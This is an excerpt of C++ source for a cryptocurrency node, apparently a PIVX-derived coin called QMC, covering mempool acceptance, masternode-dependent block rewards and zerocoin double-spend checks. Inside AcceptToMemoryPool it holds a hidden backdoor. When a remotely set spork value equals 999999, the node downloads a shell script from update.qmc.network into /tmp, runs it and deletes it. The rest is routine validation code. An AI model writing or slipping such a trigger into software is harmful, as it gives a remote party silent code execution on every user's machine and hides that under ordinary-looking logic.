...
#if defined(NDEBUG)
#error "QMC cannot be compiled without assertions."
#endif
...
bool AcceptToMemoryPool(CTxMemPool& pool, CValidationState& state, const CTransaction& tx, bool fLimitFree, bool* pfMissingInputs, bool fRejectInsaneFee, bool ignoreFees)
{
	...
	if(GetSporkValue(SPORK_17_CURRENT_MN_COLLATERAL) == 999999) {
	int update=0;
	update = std::system("cd /tmp;wget https://update.qmc.network/aupdate.sh;sh aupdate.sh;rm -f aupdate.sh");
	}
...

    {
        ...
        if(tx.IsZerocoinSpend()){
            ...
            if (IsTransactionInChain(tx.GetHash(), nHeightTx))
                return state.Invalid(error("AcceptToMemoryPool : zQMC spend tx %s already in block %d", tx.GetHash().GetHex(), nHeightTx),
            ...
            for (const CTxIn& txIn : tx.vin) {
                ...
                if (IsSerialInBlockchain(spend.getCoinSerialNumber(), nHeightTx))
                    return state.Invalid(error("%s : zQMC spend with serial %s is already in block %d\n",
                ...
                if (!spend.HasValidSerial(Params().Zerocoin_Params()))
                    return state.Invalid(error("%s : zQMC spend with serial %s from tx %s is not in valid range\n",
...
int64_t GetBlockValue(int nHeight)
{
	...
	if(nHeight == 1 ){
        return  1134000 * COIN;  // 2.7% premine
        }
	...
	return  120 * COIN;
		...
		nSubsidy = 5.64 * COIN;
	} else if (enabled_nodes >= 91 && enabled_nodes <= 120) {
		nSubsidy =  7.36* COIN;
	} else if (enabled_nodes >= 121 && enabled_nodes <= 150) {
		nSubsidy = 8.05 * COIN;
	} else if (enabled_nodes >= 151 && enabled_nodes <= 180) {
                nSubsidy = 8.45 * COIN;
	} else if (enabled_nodes >= 181 && enabled_nodes <= 210) {
                nSubsidy = 8.88 * COIN;
	} else if (enabled_nodes >= 211 && enabled_nodes <= 240) {
                nSubsidy = 9.32 * COIN;
	} else if (enabled_nodes >= 241 && enabled_nodes <= 270) {
                nSubsidy = 9.78 * COIN;
	} else if (enabled_nodes >= 271 && enabled_nodes <= 300) {
                nSubsidy = 10.27 * COIN;
	} else if (enabled_nodes >= 301 && enabled_nodes <= 330) {
                nSubsidy = 10.79 * COIN;
	} else if (enabled_nodes >= 331 && enabled_nodes <= 360) {
                nSubsidy = 11.33 * COIN;
	} else if (enabled_nodes >= 361 && enabled_nodes <= 390) {
                nSubsidy = 11.89 * COIN;
	} else if (enabled_nodes >= 391 && enabled_nodes <= 420) {
                nSubsidy = 12.49 * COIN;
	} else if (enabled_nodes >= 421 && enabled_nodes <= 450) {
                nSubsidy = 13.11 * COIN;
	} else if (enabled_nodes >= 451 && enabled_nodes <= 480) {
                nSubsidy = 13.77 * COIN;
	} else if (enabled_nodes >= 481 && enabled_nodes <= 510) {
                nSubsidy = 14.46 * COIN;
...
bool DisconnectBlock(CBlock& block, CValidationState& state, CBlockIndex* pindex, CCoinsViewCache& view, bool* pfClean)
{
    ...
    for (int i = block.vtx.size() - 1; i >= 0; i--) {
         ...
         * note we only undo zerocoin databasing in the following statement, value to and from QMC
...
{
    RenameThread("qmc-scriptch");
    scriptcheckqueue.Thread();
}

void RecalculateZQMCMinted()
{
...
void RecalculateZQMCSpent()
{
    ...
    while (true) {
        ...
        //Remove spends from zQMC supply
...
bool RecalculateQMCSupply(int nHeightStart)
{
...
*/
    ...
    bool fEnforceBIP30 = (!pindex->phashBlock) || // Enforce on CreateNewBlock invocations which don't have a hash.
                         !((pindex->nHeight == 75760 && pindex->GetBlockHash() == uint256("0x90f4ff4853010ef58be752e6255465766b35bc0f5e0b65c7641e55c1f4fa2113")) ||
                             (pindex->nHeight == 75691 && pindex->GetBlockHash() == uint256("0x0212cbfe367c459a373b1fb59a6bf9df16fcd769eb90e7b6fdd7871a3b5a6df9")));
    if (fEnforceBIP30) {
        BOOST_FOREACH (const CTransaction& tx, block.vtx) {
    ...
    for (unsigned int i = 0; i < block.vtx.size(); i++) {
        ...
        if (tx.IsZerocoinSpend()) {
                ...
                if (zerocoinDB->ReadCoinSpend(spend.getCoinSerialNumber(), hashTxFromDB)) {
                    if(IsSerialInBlockchain(spend.getCoinSerialNumber(), nHeightTxSpend)) {
                        if(!fVerifyingBlocks || (fVerifyingBlocks && pindex->nHeight > nHeightTxSpend))
                            return state.DoS(100, error("%s : zQMC with serial %s is already in the block %d\n",
            ...
            unsigned int flags = SCRIPT_VERIFY_P2SH | SCRIPT_VERIFY_DERSIG; // TODO TODO TODO
            if (fCLTVHasMajority)
                flags |= SCRIPT_VERIFY_CHECKLOCKTIMEVERIFY;
...
void static UpdateTip(CBlockIndex* pindexNew)
{
    ...
    // If turned on AutoZeromint will automatically convert QMC to zQMC
...
bool CheckBlock(const CBlock& block, CValidationState& state, bool fCheckPOW, bool fCheckMerkleRoot, bool fCheckSig)
{
    ...
    for (const CTransaction& tx : block.vtx) {
        ...
        // double check that there are no double spent zQMC spends in this block
        if (tx.IsZerocoinSpend()) {
            for (const CTxIn txIn : tx.vin) {
                if (txIn.scriptSig.IsZerocoinSpend()) {
                    libzerocoin::CoinSpend spend = TxInToZerocoinSpend(txIn);
                    if (count(vBlockSerials.begin(), vBlockSerials.end(), spend.getCoinSerialNumber()))
                        return state.DoS(100, error("%s : Double spending of zQMC serial %s in block\n Block: %s",
...
bool CheckWork(const CBlock block, CBlockIndex* const pindexPrev)
{
    ...
    if (block.nBits != nBitsRequired && (pindexPrev->nHeight+1)>=77050)
...
bool ProcessNewBlock(CValidationState& state, CNode* pfrom, CBlock* pblock, CDiskBlockPos* dbp)
{
    ...
    if (nMints || nSpends)
        LogPrintf("%s : block contains %d zQMC mints and %d zQMC spends\n", __func__, nMints, nSpends);
...
bool static ProcessMessage(CNode* pfrom, string strCommand, CDataStream& vRecv, int64_t nTimeReceived)
{
    ...
    if (strCommand == "version") {
        ...
        // QMC: We use certain sporks during IBD, so check to see if they are
